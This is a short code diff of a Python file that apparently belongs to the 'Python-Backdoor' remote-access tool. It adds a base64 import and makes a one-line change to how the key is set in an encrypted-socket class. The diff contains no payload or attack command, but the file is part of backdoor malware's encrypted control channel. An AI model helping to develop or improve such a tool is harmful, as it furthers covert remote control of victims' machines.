@@ -5,7 +5,7 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
+import base64
 import json
 import logging
 
@@ -88,7 +88,7 @@ class EncryptedSocket(object):
 
     def set_key(self, key):
         self.key = key
-        self.encryptor = Fernet(key)
+        self.encryptor = Fernet(self.key)
 
     def new_key(self):
         self.key = Fernet.generate_key()
